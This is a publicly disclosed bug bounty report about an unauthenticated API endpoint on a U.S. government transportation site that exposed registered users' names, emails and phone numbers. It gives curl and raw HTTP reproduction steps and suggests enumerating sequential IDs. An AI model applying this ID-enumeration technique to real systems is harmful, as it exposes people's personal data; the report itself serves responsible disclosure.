---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-authorization
  - env/web
substate: "resolved"
weakness: "Improper Authorization"
enriched: true
body: true
date: 2021-12-08
submitted: 2021-04-26T23:19:41.504Z
bounty_usd: null
votes: 14
cve: []
program: "[[programs/gsa_vdp|U.S. General Services Administration]]"
reporter: "alexandrio"
source: "https://hackerone.com/reports/1175980"
title: "[Transportation Management Services Solution 2.0] Improper authorization at  tmss.gsa.gov leads to data exposure of all registered users"
---
# [Transportation Management Services Solution 2.0] Improper authorization at  tmss.gsa.gov leads to data exposure of all registered users

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 14 | **Program:** U.S. General Services Administration | **Disclosed:** 2021-12-08

- Report: [https://hackerone.com/reports/1175980](https://hackerone.com/reports/1175980)
- CWE: Improper Authorization
- Submitted: 2021-04-26T23:19:41.504Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Hi team!
I hope you are having a great Tuesday :)

**Where:** https://tmss.gsa.gov/ 
**Who:** Unathenticated users
**Why:** Improper Access Control at `/tmssserver/api/public/customerregistration/{:id}/userId/`


I found an endpoint (`/tmssserver/api/public/customerregistration/{:id}/userId/`) at https://tmss.gsa.gov/ (Transportation Management Services Solution (TMSS) 2.0) that  leads to data exposure of all registerd user at the platform,  including the following data: 

* Email address
* Phone Number
* Full Name
* Secret question (If set)

## Steps To Reproduce:
1. Go to https://tmss.gsa.gov/
2. Check that you are not authenticated. 
3. Now browse to https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/ (You can replace 4750 by any other value between 0 and 4800)
4. Or just CURL `curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/4750/userId/" . The response includes email, Full name, and phone number of user with id 4750. 
{F1279543}

This is how the request looks like. As you can see there is no cookie in the headers or authentication bearer.
```curl
GET /tmssserver/api/public/customerregistration/4500/userId/ HTTP/1.1
Host: tmss.gsa.gov
Connection: close
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://tmss.preprod-acqit.helix.gsa.gov/tmss/customerregistration
Accept-Language: es-ES,es;q=0.9
dnt: 1
sec-gpc: 1

```
5. As the id is incremental note that this can be easily brute-forced to leak all the user's information. 
 `https://tmss.gsa.gov/tmssserver/api/public/customerregistration/:id/userId/`

6. I was not able to submit my user ID as I don't have one until my account gets approved, but using this endpoint you can check that my data is also being leaked here.

`curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/"`

{F1279546}

```
{"userRegisterId":192,"registrationType":"User","reportingOfficialId":1504,"agencyCode":"072","bureauCode":"00","firstName":"Alexandrio","lastName":"Wearehackerone","middleInitial":"C","title":"","addressLine1":"ThisIsMYAddress","addressLine2":"PoCAddress","city":"","stateId":null,"zip":"","zipSuffix":"","countryId":326,"phone":"6541112343","phoneExtension":"","email":"alexandrio+1@wearehackerone.com","accessRequested":"HHG","registrationStatus":"Confirm Pending","rejectReason":null,"confirmDate":null,"createdDate":"2021-04-26T22:51:08.000+0000","updateProgram":"Customer_Registration","updateId":null,"updateDate":"2021-04-26T22:51:08.000+0000","agencyName":null,"agencyBureauName":null,"stateName":null,"countryName":null}
```



If you have some questions regarding this feel free to ping me!
Bests,
@alexandrio

## Impact

Data exposure (Emails, addresses, phone numbers, full names etc) of all registered user - Unauthenticated users

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2021-04-27** @antenna: Hi @alexandrio,

Thanks for your submission! 
Your report is currently being reviewed and we'll get back to you once there's more to share.

Best regards,
@antenna
- **2021-04-28** @issamy11: @alexandrio Thank you very much for your report. Our team has been able to resolve the issue based on the information you provided. Your effort is appreciated and we wish that you'll continue to submit future security findings.
- **Report Resolved**
- **2021-04-29** @alexandrio: Hi, @issamy11 and H1 team! 
Thank you for your quick work here. I started a couple of weeks ago at H1 and this is my first resolved report! 
It's a pleasure working with you! 

Bests, 
@alexandrio
- **Agreed On Going Public**
- **Report Became Public**
